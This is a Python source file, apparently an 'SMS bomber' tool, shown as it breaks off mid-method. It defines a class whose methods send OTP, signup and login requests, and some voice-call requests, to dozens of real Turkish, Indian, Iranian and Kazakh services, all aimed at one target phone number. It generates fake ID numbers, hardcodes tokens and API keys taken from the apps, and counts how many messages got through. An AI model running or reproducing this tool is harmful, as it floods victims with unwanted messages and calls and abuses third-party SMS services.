import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SendSms():
    count = 0
    
    def __init__(self, phone, mail):
        digits = []
        tcNo = ""
        digits.append(randint(1,9))
        for i in range(1, 9):
            digits.append(randint(0,9))
        digits.append(((digits[0] + digits[2] + digits[4] + digits[6] + digits[8]) * 7 - (digits[1] + digits[3] + digits[5] + digits[7])) % 10)
        digits.append((digits[0] + digits[1] + digits[2] + digits[3] + digits[4] + digits[5] + digits[6] + digits[7] + digits[8] + digits[9]) % 10)
        for d in digits:
            tcNo += str(d)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> api.kahvedunyasi.com")
                self.count += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> api.kahvedunyasi.com")
        
    
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> bim.veesk.net")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> bim.veesk.net")

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> suiste.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> suiste.com")
                
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> evidea.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> evidea.com") 

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> api.345dijital.com")
            self.count += 1


    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> api.filemarket.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> api.filemarket.com.tr")
            
    
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> api.hayatsu.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> api.hayatsu.com.tr")


    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> gandalf.orwi.app")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> gandalf.orwi.app")     

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> frontend.dominos.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> frontend.dominos.com.tr")

    def Orwi(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
            json={"gsm": f"+90{self.phone}", "source": "orwi"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> gandalf.orwi.app")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> gandalf.orwi.app")

    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> yapp.com.tr")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> yapp.com.tr")

    def Flipkart(self):
        try:
            url = "https://www.flipkart.com/api/5/user/otp/generate"
            headers = {"X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop", "Origin": "https://www.flipkart.com", "Content-Type": "application/x-www-form-urlencoded"}
            data={"loginId": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if "emailMask" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> flipkart.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> flipkart.com")

    def Unacademy(self):
        try:
            url = "https://unacademy.com/api/v1/user/get_app_link/"
            data = {"phone": self.phone}
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> unacademy.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> unacademy.com")

    def Ajio(self):
        try:
            url = "https://login.web.ajio.com/api/auth/signupSendOTP"
            data = {
                "firstName": "Memati",
                "login": self.mail,
                "password": "QASpw@1s",
                "genderType": "Male",
                "mobileNumber": self.phone,
                "requestType": "SENDOTP"
            }
            r = requests.post(url, data=data, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> ajio.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> ajio.com")

    def Redbus(self):
        try:
            url = "https://m.redbus.in/api/getOtp"
            params = {"number": self.phone, "cc": "90", "whatsAppOpted": False}
            r = requests.get(url, params=params, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> redbus.in")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> redbus.in")

    def Divar(self):
        try:
            url = "https://api.divar.ir/v5/auth/authenticate"
            data = {"phone": f"+98{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> divar.ir")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> divar.ir")

    def Nobatir(self):
        try:
            url = "https://nobat.ir/api/public/patient/login/phone"
            data = f"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n{self.phone}\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n"
            headers = {"content-type": "multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY"}
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> nobat.ir")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> nobat.ir")

    def AlopeykLogin(self):
        try:
            url = "https://api.alopeyk.com/api/v2/login?platform=pwa"
            data = {"type": "CUSTOMER", "model": "Chrome 111.0.0.0", "platform": "pwa", "version": "10", "manufacturer": "Windows", "isVirtual": False, "serial": True, "app_version": "1.2.9", "uuid": True, "phone": str(int(self.phone))}
            headers = {"content-type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> alopeyk.com (login)")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> alopeyk.com (login)")

    def AlopeykSignup(self):
        try:
            url = "https://api.alopeyk.com/api/v2/register-customer?platform=pwa"
            data = {"type": "CUSTOMER", "model": "Chrome 111.0.0.0", "platform": "pwa", "version": "10", "manufacturer": "Windows", "isVirtual": False, "serial": True, "app_version": "1.2.9", "uuid": True, "firstname": "تست", "lastname": "تست", "phone": self.phone, "email": "", "referred_by": "", "lat": None, "lng": None}
            headers = {"content-type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> alopeyk.com (signup)")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> alopeyk.com (signup)")

    def Digistyle(self):
        try:
            url = "https://www.digistyle.com/users/login-register/"
            data = f"loginRegister%5Bemail_phone%5D={self.phone}"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> digistyle.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> digistyle.com")

    def DigikalaJet(self):
        try:
            url = "https://api.digikalajet.ir/user/login-register/"
            data = {"phone": self.phone}
            headers = {"content-type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> digikalajet.ir")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> digikalajet.ir")

    def Ghabzino(self):
        try:
            url = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
            data = {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": self.phone, "UniqueToken": None}}
            headers = {"content-type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> ghabzino.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> ghabzino.com")

    def NaimiSMS(self):
        try:
            url = "https://naimi.kz/api/app/pub/login/code"
            data = {"phone": f"+7{self.phone}", "type": "sms"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> naimi.kz (SMS)")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> naimi.kz (SMS)")

    def NaimiCall(self):
        try:
            url = "https://naimi.kz/api/app/pub/login/code"
            data = {"phone": f"+7{self.phone}", "type": "call"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> naimi.kz (Call)")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> naimi.kz (Call)")


    def MoneyMan(self):
        try:
            url = "https://moneyman.kz/secure/rest/registration/step1/confirmMobilePhone"
            data = {"mobilePhone": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> moneyman.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> moneyman.kz")

    def MyCar(self):
        try:
            url = "https://sso.mycar.kz/auth/login/"
            data = {"phone_number": f"+7{self.phone}"}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.post(url, data=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> mycar.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> mycar.kz")


    def Bilim(self):
        try:
            url = "https://login.bilimland.kz/api/v1/registration"
            data = {"phone": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=90)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> bilimland.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> bilimland.kz")

    def CleverMarket(self):
        try:
            url = "https://clevermarket.kz/auth/code"
            data = {"phoneNumber": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=90)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> clevermarket.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> clevermarket.kz")

    def Soso(self):
        try:
            url = "https://www.soso.kz/api/landing-form"
            data = {"amount": 100000, "phone": f"+7{self.phone}", "locale": "ru"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=15)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> soso.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> soso.kz")

    def Solvakz(self):
        try:
            url = "https://solva.kz/secure/rest/registration/step1/confirmMobilePhone"
            data = {"mobilePhone": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> solva.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> solva.kz")

    def Appteka(self):
        try:
            url = "https://appteka.kz/api/customers/otp"
            data = {"phone": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=30)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> appteka.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> appteka.kz")

    def Aptekaplus(self):
        try:
            url = "https://aptekaplus.kz/api/auth/v1/code"
            data = {"username": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=180)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> aptekaplus.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> aptekaplus.kz")

    def KorzinaVDom(self):
        try:
            url = "https://api.korzinavdom.kz/client/auth/smsRequest"
            data = {"phone": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> korzinavdom.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> korzinavdom.kz")

    def Solva(self):
        try:
            url = "https://solva.kz/secure/rest/registration/step1/confirmMobilePhone"
            data = {"mobilePhone": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> solva.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> solva.kz")

    def Bilimland(self):
        try:
            url = "https://login.bilimland.kz/api/v1/registration"
            data = {"phone": f"+7{self.phone}"}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> bilimland.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> bilimland.kz")

    def Chinchin(self):
        try:
            url = "https://shop.chinchin.kz/ajax/sms.php"
            data = {"phone": f"+7{self.phone}", "t": "ss"}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.post(url, data=data, headers=headers, timeout=60)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> chinchin.kz")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> chinchin.kz")

    def Daryn(self):
        try:
            url = "https://api.daryn.online/api/v1/users/register/send-code"
            data = {"phone": self.phone}
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=120)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> daryn.online")
                self.count += 1
